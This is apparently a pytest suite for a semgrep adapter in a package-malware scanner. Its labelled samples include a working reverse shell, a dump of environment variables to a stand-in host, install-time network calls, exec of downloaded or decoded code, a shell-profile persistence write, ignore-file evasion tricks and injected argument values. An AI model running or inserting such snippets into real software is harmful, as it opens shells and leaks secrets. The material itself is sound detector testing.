"""Tests for the semgrep adapter (``app.analysis.analyzers.semgrep_scan``) and Warden's packaged rules.

semgrep is not installed on CI hosts, so the adapter is exercised against labelled fixtures
shaped like ``semgrep scan --json`` output (``tests/data/semgrep``) and an in-process fake of
the tool runner. Rule files are validated structurally with ``yaml.safe_load``. Two opt-in
tests run the real tool when ``WARDEN_TEST_SEMGREP`` names a semgrep binary; they check that
every packaged rule fires on the malicious samples below and stays silent on the benign ones.

The package sources in this module are analysed as *text* (by semgrep or by ``ast.parse`` for
context classification). Nothing in them is ever imported or executed; hosts and URLs use
reserved documentation ranges and ``.invalid`` names.
"""

from __future__ import annotations

import json
import os
import re
from pathlib import Path
from typing import Any

import pytest
import yaml

from app.analysis import taxonomy
from app.analysis.analyzers import semgrep_scan as sg
from app.analysis.analyzers.base import PackageContext, SourceFile, ToolStatus
from app.analysis.findings import Category, Finding, Provenance, Severity
from app.analysis.signals import Capability, Code
from app.analysis.tools import ToolResult, clear_tool_cache
from app.core.config import settings

DATA = Path(__file__).parent / "data" / "semgrep"
PLACEHOLDER = "__WORKSPACE__"
IS_WINDOWS = os.name == "nt"
POLICY_MIN_CONFIDENCE = 0.7  # the phase-2 policy engine's default gate for deny rules

# --------------------------------------------------------------------------- sample packages
MALICIOUS_FILES: dict[str, str] = {
    "pkg/loader.py": (
        "import base64 as b64\n"
        "import zlib\n"
        "\n"
        "\n"
        "def stage(blob):\n"
        "    code = zlib.decompress(b64.b64decode(blob)).decode(\"utf-8\")\n"
        "    exec(compile(code, \"<stage>\", \"exec\"))\n"
    ),
    "pkg/dropper.py": (
        "import marshal\n"
        "import pickle\n"
        "from urllib.request import urlopen\n"
        "\n"
        "import requests\n"
        "\n"
        "\n"
        "def run(url):\n"
        "    exec(requests.get(url, timeout=5).text)\n"
        "\n"
        "\n"
        "def load_code(url):\n"
        "    with urlopen(url) as resp:\n"
        "        return marshal.loads(resp.read())\n"
        "\n"
        "\n"
        "def load_state(url):\n"
        "    return pickle.loads(requests.get(url).content)\n"
    ),
    "pkg/shell.py": (
        "import subprocess\n"
        "\n"
        "\n"
        "def ping(host):\n"
        "    return subprocess.run(\"ping -c 1 \" + host, shell=True, check=False)\n"
    ),
    "setup.py": (
        "import urllib.request\n"
        "\n"
        "from setuptools import setup\n"
        "\n"
        "urllib.request.urlopen(\"https://collector.invalid/install?pkg=demo\")\n"
        "\n"
        "setup(name=\"demo\", version=\"1.0.0\")\n"
    ),
    "pkg/steal.py": (
        "import json\n"
        "import os\n"
        "\n"
        "import requests\n"
        "\n"
        "\n"
        "def report():\n"
        "    requests.post(\"https://collector.invalid/e\", data=json.dumps(dict(os.environ)), timeout=5)\n"
    ),
    "pkg/persist.py": (
        "import os\n"
        "\n"
        "with open(os.path.expanduser(\"~/.bashrc\"), \"a\") as fh:\n"
        "    fh.write(\"python -m demo.beacon &\\n\")\n"
    ),
    "pkg/native.py": (
        "import ctypes\n"
        "import urllib.request\n"
        "\n"
        "\n"
        "def load(url, path):\n"
        "    urllib.request.urlretrieve(url, path)\n"
        "    return ctypes.CDLL(path)\n"
    ),
    "pkg/revshell.py": (
        "import os\n"
        "import pty\n"
        "import socket\n"
        "\n"
        "\n"
        "def connect(host, port):\n"
        "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "    s.connect((host, port))\n"
        "    os.dup2(s.fileno(), 0)\n"
        "    os.dup2(s.fileno(), 1)\n"
        "    os.dup2(s.fileno(), 2)\n"
        "    pty.spawn(\"/bin/sh\")\n"
    ),
    "pkg/beacon.py": (
        "import requests\n"
        "\n"
        "\n"
        "def beacon():\n"
        "    return requests.get(\"http://203.0.113.50:8080/tasks\", timeout=10)\n"
    ),
    # Evasion attempts: an inline suppression comment and a payload in a default-ignored directory.
    "pkg/nosem.py": (
        "import base64\n"
        "\n"
        "exec(base64.b64decode(\"cHJpbnQoJ2hpJyk=\"))  # nosemgrep\n"
    ),
    "tests/test_hidden.py": (
        "import base64\n"
        "\n"
        "exec(base64.b64decode(\"cHJpbnQoJ2hpJyk=\"))\n"
    ),
    # Lone-CR line endings: CPython runs this file, but unnormalised semgrep 1.177.0 sees one line and
    # fails to parse it. The adapter normalises lone CR to LF, so the match is on Python's line 3.
    "pkg/cr_loader.py": (
        "import base64\r"
        "\r"
        "exec(base64.b64decode(\"cHJpbnQoJ2hpJyk=\"))\r"
    ),
}
# Files a hostile package can ship to blind semgrep's target selection.
HOSTILE_CONTROL_FILES = {
    ".semgrepignore": "*\n",
    "pkg/.semgrepignore": "*.py\n",
    ".gitignore": "*.py\n",
    ".git/info/exclude": "*\n",
}
EXPECTED_MALICIOUS_HITS = {
    ("warden.obfuscation.exec-decoded-payload", "pkg/loader.py", 7),
    ("warden.obfuscation.exec-decoded-payload", "pkg/nosem.py", 3),
    ("warden.obfuscation.exec-decoded-payload", "tests/test_hidden.py", 3),
    ("warden.obfuscation.exec-decoded-payload", "pkg/cr_loader.py", 3),
    ("warden.malicious_behavior.exec-network-payload", "pkg/dropper.py", 9),
    ("warden.malicious_behavior.marshal-loads-network-data", "pkg/dropper.py", 14),
    ("warden.malicious_behavior.pickle-loads-network-data", "pkg/dropper.py", 18),
    ("warden.capability.shell-dynamic-command", "pkg/shell.py", 5),
    ("warden.install_time_execution.setup-network-call", "setup.py", 5),
    ("warden.credential_access.environ-dump-to-network", "pkg/steal.py", 8),
    ("warden.malicious_behavior.persistence-write", "pkg/persist.py", 3),
    ("warden.malicious_behavior.ctypes-load-downloaded-library", "pkg/native.py", 7),
    ("warden.malicious_behavior.reverse-shell", "pkg/revshell.py", 12),
    ("warden.capability.raw-ip-url-request", "pkg/beacon.py", 5),
}
# Realistic benign code, one module per detector, exercising the constructs each rule must NOT flag.
BENIGN_FILES: dict[str, str] = {
    # exec-decoded-payload: decoding data (not code); executing a local script file.
    "demo/config.py": (
        "import ast\n"
        "import base64\n"
        "import json\n"
        "\n"
        "\n"
        "def load_settings(blob):\n"
        "    return json.loads(base64.b64decode(blob))\n"
        "\n"
        "\n"
        "def load_literal(blob):\n"
        "    return ast.literal_eval(base64.b64decode(blob).decode(\"utf-8\"))\n"
        "\n"
        "\n"
        "def run_script(path):\n"
        "    with open(path, encoding=\"utf-8\") as fh:\n"
        "        exec(compile(fh.read(), path, \"exec\"), {\"__name__\": \"__main__\"})\n"
    ),
    # exec-network-payload: JSON from an API; eval of caller-supplied (not downloaded) input.
    "demo/client.py": (
        "import requests\n"
        "\n"
        "\n"
        "def latest_version(name):\n"
        "    data = requests.get(f\"https://pypi.org/pypi/{name}/json\", timeout=10).json()\n"
        "    return data[\"info\"][\"version\"]\n"
        "\n"
        "\n"
        "def evaluate(expression, namespace):\n"
        "    return eval(expression, namespace)\n"
    ),
    # marshal / pickle rules: local cache files and .pyc bytes.
    "demo/cache.py": (
        "import marshal\n"
        "import pickle\n"
        "from pathlib import Path\n"
        "\n"
        "\n"
        "def load_cache(path: Path):\n"
        "    with path.open(\"rb\") as fh:\n"
        "        return pickle.load(fh)\n"
        "\n"
        "\n"
        "def load_bytecode(pyc: bytes):\n"
        "    return marshal.loads(pyc[16:])\n"
    ),
    # shell-dynamic-command: constant shell commands and argument lists.
    "demo/build.py": (
        "import os\n"
        "import subprocess\n"
        "import sys\n"
        "\n"
        "MAKE = \"make -j4\"\n"
        "\n"
        "\n"
        "def build():\n"
        "    subprocess.check_call(\"make\", shell=True)\n"
        "    subprocess.check_call(MAKE, shell=True)\n"
        "    subprocess.run([\"git\", \"describe\", \"--tags\"], check=True)\n"
        "    subprocess.run([sys.executable, \"-m\", \"pip\", \"--version\"], check=False)\n"
        "    os.system(\"clear\")\n"
    ),
    # setup-network-call: a network helper that is defined but not called at top level.
    "setup.py": (
        "import os\n"
        "import re\n"
        "\n"
        "from setuptools import setup\n"
        "\n"
        "\n"
        "def read_version():\n"
        "    with open(os.path.join(\"demo\", \"__init__.py\"), encoding=\"utf-8\") as fh:\n"
        "        return re.search(r'__version__ = \"([^\"]+)\"', fh.read()).group(1)\n"
        "\n"
        "\n"
        "def fetch_changelog():\n"
        "    import urllib.request\n"
        "\n"
        "    return urllib.request.urlopen(\"https://example.org/CHANGELOG\").read().decode()\n"
        "\n"
        "\n"
        "setup(name=\"demo\", version=read_version(), url=\"https://github.com/example/demo\")\n"
    ),
    # environ-dump-to-network: single named variables, an explicit allowlist, env for a child process.
    "demo/api.py": (
        "import os\n"
        "import subprocess\n"
        "\n"
        "import requests\n"
        "\n"
        "\n"
        "def call_api(url):\n"
        "    token = os.environ[\"DEMO_API_TOKEN\"]\n"
        "    proxy = os.environ.get(\"HTTPS_PROXY\")\n"
        "    return requests.get(url, headers={\"X-Api-Key\": token}, proxies={\"https\": proxy}, timeout=10)\n"
        "\n"
        "\n"
        "def forward_selected(url, names):\n"
        "    selected = {name: os.environ[name] for name in names if name in os.environ}\n"
        "    return requests.post(url, json=selected, timeout=10)\n"
        "\n"
        "\n"
        "def spawn(cmd):\n"
        "    return subprocess.run(cmd, env=dict(os.environ, PYTHONUNBUFFERED=\"1\"), check=False)\n"
    ),
    # persistence-write: reading shell rc files, writing an ordinary cache file, a help string.
    "demo/shellrc.py": (
        "import os\n"
        "from pathlib import Path\n"
        "\n"
        "HINT = \"Add 'eval \\\"$(demo completion)\\\"' to ~/.bashrc\"\n"
        "\n"
        "\n"
        "def read_bashrc():\n"
        "    with open(os.path.expanduser(\"~/.bashrc\"), encoding=\"utf-8\") as fh:\n"
        "        return fh.read()\n"
        "\n"
        "\n"
        "def has_zshrc():\n"
        "    return (Path.home() / \".zshrc\").exists()\n"
        "\n"
        "\n"
        "def save_state(data):\n"
        "    cache = Path.home() / \".cache\" / \"demo\" / \"user_profile.json\"\n"
        "    cache.write_text(data, encoding=\"utf-8\")\n"
    ),
    # ctypes-load-downloaded-library: bundled library loaded next to an unrelated API call.
    "demo/native.py": (
        "import ctypes\n"
        "import os\n"
        "\n"
        "import requests\n"
        "\n"
        "_HERE = os.path.dirname(os.path.abspath(__file__))\n"
        "\n"
        "\n"
        "def load_bundled():\n"
        "    return ctypes.CDLL(os.path.join(_HERE, \"_demo.so\"))\n"
        "\n"
        "\n"
        "def check_for_update():\n"
        "    info = requests.get(\"https://pypi.org/pypi/demo/json\", timeout=10).json()\n"
        "    lib = ctypes.CDLL(os.path.join(_HERE, \"_demo.so\"))\n"
        "    return info[\"info\"][\"version\"], lib\n"
    ),
    # reverse-shell: daemonisation (dup2 onto a log file + exec) and a plain socket client/server.
    "demo/daemon.py": (
        "import os\n"
        "import socket\n"
        "import subprocess\n"
        "\n"
        "\n"
        "def daemonize(logfile):\n"
        "    fd = os.open(logfile, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)\n"
        "    os.dup2(fd, 1)\n"
        "    os.dup2(fd, 2)\n"
        "    os.execv(\"/usr/bin/python3\", [\"python3\", \"-m\", \"demo.worker\"])\n"
        "\n"
        "\n"
        "def health_check(host, port):\n"
        "    with socket.create_connection((host, port), timeout=5) as conn:\n"
        "        conn.sendall(b\"PING\\r\\n\")\n"
        "        return conn.recv(16)\n"
        "\n"
        "\n"
        "def serve(port):\n"
        "    server = socket.socket()\n"
        "    server.bind((\"127.0.0.1\", port))\n"
        "    server.listen()\n"
        "    conn, _ = server.accept()\n"
        "    subprocess.run([\"echo\", \"accepted\"], check=False)\n"
        "    return conn\n"
    ),
    # raw-ip-url-request: loopback, private, link-local metadata, public DNS resolver, host names.
    "demo/endpoints.py": (
        "import requests\n"
        "\n"
        "LOCAL = \"http://127.0.0.1:8080/health\"\n"
        "\n"
        "\n"
        "def probes():\n"
        "    requests.get(LOCAL, timeout=2)\n"
        "    requests.get(\"http://localhost:11434/api/tags\", timeout=2)\n"
        "    requests.get(\"http://192.168.1.1/status\", timeout=2)\n"
        "    requests.get(\"http://10.0.0.5:9100/metrics\", timeout=2)\n"
        "    requests.get(\"http://169.254.169.254/latest/meta-data/\", timeout=2)\n"
        "    requests.get(\"https://1.1.1.1/dns-query?name=example.org\", timeout=2)\n"
        "    requests.get(\"https://pypi.org/simple/\", timeout=2)\n"
    ),
}
REQUIRED_RULE_IDS = {rule_id for rule_id, _, _ in EXPECTED_MALICIOUS_HITS}
LEVELS = ("HIGH", "MEDIUM", "LOW")
_MATCH_KEYS = {"pattern", "patterns", "pattern-either", "pattern-regex"}


# --------------------------------------------------------------------------- helpers
def make_ctx(files: dict[str, str]) -> PackageContext:
    return PackageContext(
        ecosystem="pypi", name="demo", version="1.0.0",
        files=[SourceFile(relpath=k, text=v, size=len(v.encode("utf-8"))) for k, v in files.items()],
    )


def load_rules_document() -> dict:
    return yaml.safe_load(sg.PACKAGED_RULES.read_text(encoding="utf-8"))


def rules_by_id() -> dict[str, dict]:
    return {rule["id"]: rule for rule in load_rules_document()["rules"]}


def fixture_text(name: str, root: str | os.PathLike[str]) -> str:
    raw = (DATA / name).read_text(encoding="utf-8")
    return raw.replace(PLACEHOLDER, json.dumps(os.fspath(root))[1:-1])


def fixture_document(root: str | os.PathLike[str], name: str = "semgrep_results.json") -> dict:
    return json.loads(fixture_text(name, root))


def source_line(relpath: str, line: int) -> str:
    return MALICIOUS_FILES[relpath].split("\n")[line - 1].strip()


def result(rule_id: str, path: str, line: int | None, *, severity: str = "WARNING", col: int = 1,
           metadata: dict | None = None, message: str = "fixture message") -> dict[str, Any]:
    start: dict[str, Any] = {"col": col}
    if line is not None:
        start["line"] = line
    return {"check_id": rule_id, "path": path, "start": start, "end": dict(start),
            "extra": {"message": message, "metadata": metadata or {}, "severity": severity}}


def _walk(node: Any):
    if isinstance(node, dict):
        for key, value in node.items():
            yield key
            yield from _walk(value)
    elif isinstance(node, list):
        for value in node:
            yield from _walk(value)
    else:
        yield node


def _metavariable_regexes(node: Any) -> list[tuple[str, str]]:
    found: list[tuple[str, str]] = []
    if isinstance(node, dict):
        spec = node.get("metavariable-regex")
        if isinstance(spec, dict):
            found.append((spec["metavariable"], spec["regex"]))
        for value in node.values():
            found.extend(_metavariable_regexes(value))
    elif isinstance(node, list):
        for value in node:
            found.extend(_metavariable_regexes(value))
    return found


def _literal_regexes(node: Any) -> list[str]:
    found: list[str] = []
    if isinstance(node, dict):
        for key, value in node.items():
            if key == "pattern" and isinstance(value, str):
                match = re.fullmatch(r'\s*"=~/(.*)/"\s*', value, re.S)
                if match:
                    found.append(match.group(1))
            found.extend(_literal_regexes(value))
    elif isinstance(node, list):
        for value in node:
            found.extend(_literal_regexes(value))
    return found


class FakeRunner:
    """Stands in for ``run_tool``: records the call and a snapshot of the workspace."""

    def __init__(self, respond):
        self.respond = respond
        self.calls: list[dict[str, Any]] = []

    def __call__(self, argv, *, timeout, cwd=None, extra_env=None, max_output_bytes=None):
        workspace = Path(argv[-1])
        paths = sorted((p for p in workspace.rglob("*") if p.is_file()), key=lambda p: p.as_posix())
        files = [p.relative_to(workspace).as_posix() for p in paths]
        ignore = workspace / ".semgrepignore"
        self.calls.append({
            "argv": list(argv), "timeout": timeout, "cwd": cwd, "extra_env": dict(extra_env or {}),
            "workspace": workspace, "files": files,
            "contents": {p.relative_to(workspace).as_posix(): p.read_bytes() for p in paths},
            "ignore": ignore.read_text(encoding="utf-8") if ignore.is_file() else None,
            "max_output_bytes": max_output_bytes,
        })
        return self.respond(workspace)


@pytest.fixture()
def tool_available(monkeypatch):
    monkeypatch.setattr(sg, "find_tool", lambda binary, **kw: ToolStatus(name="semgrep", available=True,
                                                                         version="1.177.0"))


# =========================================================================== packaged rules
def test_packaged_rules_have_required_structure_and_unique_ids():
    rules = load_rules_document()["rules"]
    ids = [rule["id"] for rule in rules]
    assert len(ids) == len(set(ids))
    assert set(ids) == REQUIRED_RULE_IDS
    for rule in rules:
        rule_id = rule["id"]
        match = re.fullmatch(r"warden\.([a-z_]+)\.([a-z0-9]+(?:-[a-z0-9]+)*)", rule_id)
        assert match, rule_id
        assert isinstance(rule["message"], str) and len(rule["message"].split()) >= 10, rule_id
        assert rule["severity"] in {"ERROR", "WARNING", "INFO"}, rule_id
        assert rule["languages"] == ["python"], rule_id
        if rule.get("mode") == "taint":
            assert rule["pattern-sources"] and rule["pattern-sinks"], rule_id
            assert not _MATCH_KEYS & set(rule), rule_id
        else:
            assert "mode" not in rule and len(_MATCH_KEYS & set(rule)) == 1, rule_id
        md = rule["metadata"]
        assert md["category"] == match.group(1) and md["category"] in sg.ALLOWED_CATEGORIES, rule_id
        assert taxonomy.get(md["warden_code"]) is not None, rule_id
        assert md["confidence"] in LEVELS and md["likelihood"] in LEVELS and md["impact"] in LEVELS, rule_id
        base = sg.parse_confidence(md["warden_confidence"])
        assert base is not None, rule_id
        expected_label = "HIGH" if base >= 0.8 else "MEDIUM" if base >= 0.6 else "LOW"
        assert md["confidence"] == expected_label, rule_id
        assert md["cwe"] and all(re.fullmatch(r"CWE-\d+: \S.*", cwe) for cwe in md["cwe"]), rule_id
        assert md["references"] and all(ref.startswith("https://") for ref in md["references"]), rule_id
        by_context = md.get("warden_confidence_by_context")
        if by_context is not None:
            values = {ctx: sg.parse_confidence(value) for ctx, value in by_context.items()}
            assert set(values) == set(sg.CONTEXTS) and None not in values.values(), rule_id
            assert values["runtime"] == base, rule_id
            assert values["test-file"] == min(values.values()), rule_id


def test_packaged_rules_contain_no_yaml_floats():
    # semgrep 1.177.0's rule loader crashes (exit 2, no JSON) on float metadata such as 0.85.
    floats = [value for value in _walk(load_rules_document()) if isinstance(value, float)]
    assert floats == []


def test_rule_confidence_is_calibrated_against_the_policy_gate():
    rules = rules_by_id()
    base = {rule_id: sg.parse_confidence(rule["metadata"]["warden_confidence"]) for rule_id, rule in rules.items()}
    for rule_id, rule in rules.items():
        if rule["metadata"]["category"] == "capability":
            by_context = rule["metadata"].get("warden_confidence_by_context") or {}
            values = [base[rule_id], *(sg.parse_confidence(v) for v in by_context.values())]
            assert max(values) < POLICY_MIN_CONFIDENCE, rule_id  # capability-grade never hard-blocks alone
            assert rule["severity"] == "WARNING", rule_id
    native = rules["warden.malicious_behavior.ctypes-load-downloaded-library"]["metadata"]
    assert base["warden.malicious_behavior.ctypes-load-downloaded-library"] < POLICY_MIN_CONFIDENCE
    assert min(sg.parse_confidence(native["warden_confidence_by_context"][c])
               for c in ("install-time", "import-time")) >= 0.85
    for name in ("reverse-shell", "exec-network-payload", "marshal-loads-network-data"):
        assert base[f"warden.malicious_behavior.{name}"] >= 0.85
    assert base["warden.obfuscation.exec-decoded-payload"] >= 0.85
    assert base["warden.credential_access.environ-dump-to-network"] >= 0.85
    # Rules that legitimate software can trip stay below the gate when the match is runtime code.
    assert base["warden.malicious_behavior.pickle-loads-network-data"] < POLICY_MIN_CONFIDENCE
    persistence = rules["warden.malicious_behavior.persistence-write"]["metadata"]["warden_confidence_by_context"]
    assert sg.parse_confidence(persistence["runtime"]) < POLICY_MIN_CONFIDENCE
    assert sg.parse_confidence(persistence["install-time"]) >= 0.85


def test_rule_regexes_compile():
    document = load_rules_document()
    regexes = [regex for _, regex in _metavariable_regexes(document)] + _literal_regexes(document)
    assert len(regexes) >= 5
    for regex in regexes:
        re.compile(regex)


@pytest.mark.parametrize(("url", "matches"), [
    ("http://203.0.113.50:8080/tasks", True),
    ("https://45.33.32.156/x", True),
    ("http://user:pw@198.51.100.4:81/", True),
    ("http://172.32.1.1/", True),
    ("ftp://198.51.100.7/payload", True),
    ("https://1.1.1.10/x", True),
    ("http://127.0.0.1:8080/health", False),
    ("http://10.0.0.5:9100/metrics", False),
    ("http://192.168.1.1/status", False),
    ("http://172.20.0.1/", False),
    ("http://169.254.169.254/latest/meta-data/", False),
    ("http://0.0.0.0:5000/", False),
    ("https://1.1.1.1/dns-query?name=example.org", False),
    ("https://8.8.8.8/resolve", False),
    ("https://pypi.org/simple/", False),
    ("http://203.0.113.50.nip.io/", False),
    ("http://999.1.1.1/", False),
    ("http://[2001:db8::1]/", False),  # IPv6 literals are a documented gap
])
def test_raw_ip_rule_regex_targets_public_ipv4_only(url, matches):
    rule = rules_by_id()["warden.capability.raw-ip-url-request"]
    [(metavariable, regex)] = _metavariable_regexes(rule)
    assert metavariable == "$URL"
    assert bool(re.match(regex, url)) is matches


@pytest.mark.parametrize(("path", "matches"), [
    ("~/.bashrc", True),
    ("/home/demo/.zshrc", True),
    ("~/.profile", True),
    ("/etc/cron.d/demo", True),
    ("/var/spool/cron/crontabs/root", True),
    ("/etc/systemd/system/demo.service", True),
    ("~/.config/systemd/user/demo.service", True),
    ("~/.config/autostart/demo.desktop", True),
    ("~/Library/LaunchAgents/com.demo.plist", True),
    ("C:\\Users\\demo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\demo.bat", True),
    ("~/.cache/demo/user_profile.json", False),
    ("/tmp/xbashrc", False),
    ("profile.py", False),
    ("/etc/hosts", False),
    ("~/.config/demo/settings.toml", False),
])
def test_persistence_rule_path_regex(path, matches):
    [regex] = _literal_regexes(rules_by_id()["warden.malicious_behavior.persistence-write"])
    assert bool(re.search(regex, path)) is matches


# =========================================================================== organisational configs
@pytest.mark.parametrize(("value", "reason"), [
    ("p/python", "registry_reference"),
    ("r/python.lang.security.audit.exec-detected", "registry_reference"),
    ("s/abcd1234", "registry_reference"),
    ("tr/demo-rule", "registry_reference"),
    ("auto", "registry_reference"),
    ("supply-chain", "registry_reference"),
    ("https://rules.example.invalid/warden.yml", "remote_url"),
    ("http://rules.example.invalid/warden.yml", "remote_url"),
    ("file:///etc/semgrep/rules.yml", "remote_url"),
    ("git@github.com:acme/rules.git", "remote_url"),
    ("-", "stdin"),
    ("\\\\fileserver\\share\\rules.yml", "remote_path"),
    ("//fileserver/share/rules.yml", "remote_path"),
    ("", "empty"),
    ("   ", "empty"),
    ("rules\x00.yml", "invalid_characters"),
    ("rules\n--config=p/python", "invalid_characters"),
])
def test_remote_registry_and_malformed_configs_are_refused(tmp_path, value, reason):
    decision = sg.validate_extra_config(value, [tmp_path.resolve()])
    assert (decision.accepted, decision.reason, decision.path) == (False, reason, None)
    assert "\x00" not in decision.config and "\n" not in decision.config


def test_non_string_config_is_refused(tmp_path):
    assert sg.validate_extra_config(42, [tmp_path.resolve()]).reason == "invalid_type"


def test_local_rule_file_and_directory_inside_an_allowlisted_root_are_accepted(tmp_path):
    root = tmp_path / "org-rules"
    (root / "team").mkdir(parents=True)
    rules_file = root / "acme.yml"
    rules_file.write_text("rules: []\n", encoding="utf-8")
    (root / "team" / "extra.yaml").write_text("rules: []\n", encoding="utf-8")
    accepted, refused = sg.resolve_extra_configs(
        [str(rules_file), str(root / "team"), str(rules_file), str(sg.PACKAGED_RULES)], [str(root)])
    assert refused == []
    assert accepted == [os.path.realpath(rules_file), os.path.realpath(root / "team")]  # duplicates dropped
    argv = sg.build_argv("semgrep", tmp_path / "ws", extra_configs=accepted)
    assert argv[2] == f"--config={sg.PACKAGED_RULES}"
    assert argv[3:5] == [f"--config={accepted[0]}", f"--config={accepted[1]}"]


def test_configs_that_escape_the_allowlisted_root_are_refused(tmp_path, monkeypatch):
    root = tmp_path / "org-rules"
    root.mkdir()
    (root / "notes.txt").write_text("not rules\n", encoding="utf-8")
    (tmp_path / "outside.yml").write_text("rules: []\n", encoding="utf-8")
    sibling = tmp_path / "org-rules-evil"
    sibling.mkdir()
    (sibling / "r.yml").write_text("rules: []\n", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    cases = {
        str(tmp_path / "outside.yml"): "outside_allowed_roots",
        os.path.join(str(root), "..", "outside.yml"): "outside_allowed_roots",
        "org-rules/../outside.yml": "outside_allowed_roots",
        "outside.yml": "outside_allowed_roots",
        str(sibling / "r.yml"): "outside_allowed_roots",  # shares the root's name as a string prefix
        str(root / "missing.yml"): "not_found",
        str(root / "notes.txt"): "unsupported_file_type",
    }
    accepted, refused = sg.resolve_extra_configs(list(cases), [str(root)])
    assert accepted == []
    assert [d.reason for d in refused] == list(cases.values())
    # A relative path that stays inside the root is fine.
    (root / "ok.yml").write_text("rules: []\n", encoding="utf-8")
    assert sg.resolve_extra_configs(["org-rules/ok.yml"], [str(root)])[0] == [os.path.realpath(root / "ok.yml")]


def test_without_a_usable_allowlisted_root_every_extra_config_is_refused(tmp_path):
    rules_file = tmp_path / "acme.yml"
    rules_file.write_text("rules: []\n", encoding="utf-8")
    for roots in ([], None, ["relative/dir", str(tmp_path / "missing"), 42, "", "\\\\srv\\share"]):
        accepted, refused = sg.resolve_extra_configs([str(rules_file)], roots)
        assert accepted == [] and [d.reason for d in refused] == ["no_allowed_roots"]


def _symlink_or_skip(target: Path, link: Path, *, directory: bool = False) -> None:
    try:
        os.symlink(target, link, target_is_directory=directory)
    except (OSError, NotImplementedError) as exc:  # Windows without symlink privilege
        pytest.skip(f"symlinks unavailable on this host: {type(exc).__name__}")


def test_symlinks_cannot_smuggle_rule_content_from_outside_the_root(tmp_path):
    root = tmp_path / "org"
    (root / "dir").mkdir(parents=True)
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "remote.yml").write_text("rules: []\n", encoding="utf-8")
    _symlink_or_skip(elsewhere / "remote.yml", root / "linked.yml")
    _symlink_or_skip(elsewhere, root / "dir" / "escape", directory=True)
    accepted, refused = sg.resolve_extra_configs([str(root / "linked.yml"), str(root / "dir")], [str(root)])
    assert accepted == []
    assert [d.reason for d in refused] == ["outside_allowed_roots", "symlink_escape"]


@pytest.mark.skipif(not IS_WINDOWS, reason="directory junctions are Windows-specific")
def test_directory_junctions_cannot_smuggle_rule_content_from_outside_the_root(tmp_path):
    # Junctions need no special privilege on Windows, so they are the realistic escape vector there.
    winapi = pytest.importorskip("_winapi")
    if not hasattr(winapi, "CreateJunction"):
        pytest.skip("_winapi.CreateJunction unavailable")
    root = tmp_path / "org"
    (root / "team").mkdir(parents=True)
    (root / "team" / "ok.yml").write_text("rules: []\n", encoding="utf-8")
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "remote.yml").write_text("rules: []\n", encoding="utf-8")
    try:
        winapi.CreateJunction(str(elsewhere), str(root / "team" / "linked"))
    except OSError as exc:
        pytest.skip(f"junction creation failed: {exc.winerror}")
    accepted, refused = sg.resolve_extra_configs(
        [str(root / "team"), str(root / "team" / "linked"), str(root / "team" / "linked" / "remote.yml")], [str(root)])
    assert accepted == []
    assert [d.reason for d in refused] == ["symlink_escape", "outside_allowed_roots", "outside_allowed_roots"]


def test_config_directory_walk_is_bounded(tmp_path, monkeypatch):
    root = tmp_path / "org"
    root.mkdir()
    for i in range(5):
        (root / f"r{i}.yml").write_text("rules: []\n", encoding="utf-8")
    monkeypatch.setattr(sg, "MAX_CONFIG_DIR_ENTRIES", 3)
    _, refused = sg.resolve_extra_configs([str(root)], [str(root)])
    assert [d.reason for d in refused] == ["too_many_entries"]


# =========================================================================== argv
def test_build_argv_is_a_hardened_argument_list(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "MAX_ANALYZED_FILE_BYTES", 1000)
    workspace = tmp_path / "work space; echo pwned"  # one argv element, never shell-parsed
    extra = str(tmp_path / "org" / "acme.yml")
    argv = sg.build_argv("semgrep", workspace, extra_configs=[extra], rule_timeout=7)
    assert isinstance(argv, list) and all(isinstance(arg, str) for arg in argv)
    assert argv[:4] == ["semgrep", "scan", f"--config={sg.PACKAGED_RULES}", f"--config={extra}"]
    for flag in ("--json", "--metrics=off", "--disable-version-check", "--no-git-ignore", "--disable-nosem",
                 "--no-rewrite-rule-ids", "--oss-only"):
        assert argv.count(flag) == 1, flag
    assert "--timeout=7" in argv and f"--timeout-threshold={sg.RULE_TIMEOUT_THRESHOLD}" in argv
    assert f"--max-target-bytes={1000 * sg.TARGET_BYTES_FACTOR}" in argv
    assert f"--project-root={workspace}" in argv
    assert argv[-1] == str(workspace)
    assert not any(arg in ("--enable-nosem", "--pro", "--error") for arg in argv)


def test_build_argv_rule_timeout_is_an_integer():
    # semgrep 1.177.0 rejects "--timeout 0.01" ("is not a valid integer").
    argv = sg.build_argv("semgrep", "ws", rule_timeout=2.9)  # type: ignore[arg-type]
    assert "--timeout=2" in argv
    assert "--timeout=1" in sg.build_argv("semgrep", "ws", rule_timeout=0)


def test_tool_env_disables_metrics_and_version_checks():
    assert sg.tool_env() == {"SEMGREP_SEND_METRICS": "off", "SEMGREP_ENABLE_VERSION_CHECK": "0", "NO_COLOR": "1"}


@pytest.mark.parametrize(("relpath", "control"), [
    (".semgrepignore", True),
    ("pkg/sub/.semgrepignore", True),
    ("PKG/.SemgrepIgnore", True),
    (".gitignore", True),
    (".git/config", True),
    ("pkg/.semgrep/rules.yml", True),
    (".semgrep.yml", True),
    ("pkg\\.semgrepignore", True),
    ("pkg/semgrepignore.py", False),
    ("pkg/gitignore_helpers.py", False),
    ("setup.py", False),
])
def test_is_control_file(relpath, control):
    assert sg.is_control_file(relpath) is control


# =========================================================================== normaliser (fixture)
def test_fixture_lines_point_at_real_sample_source_lines():
    document = fixture_document("/fixture-root")
    for item in document["results"]:
        line = item.get("start", {}).get("line")
        rel = str(item.get("path", "")).replace("/fixture-root/", "", 1)
        if rel in MALICIOUS_FILES and isinstance(line, int) and line >= 1:
            assert source_line(rel, line), (rel, line)


def test_normalizer_maps_fixture_results_to_findings(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    scan = sg.normalize_results(fixture_document(root), root, make_ctx(MALICIOUS_FILES).files)
    findings = scan.findings
    assert [(f.evidence["rule_id"], f.location.file, f.location.line) for f in findings] == [
        ("acme.supply-chain.pickle-load", "pkg/dropper.py", 18),
        ("warden.obfuscation.exec-decoded-payload", "pkg/loader.py", 7),
        ("warden.malicious_behavior.persistence-write", "pkg/persist.py", 3),
        ("acme.python.reverse-shell-critical", "pkg/revshell.py", None),
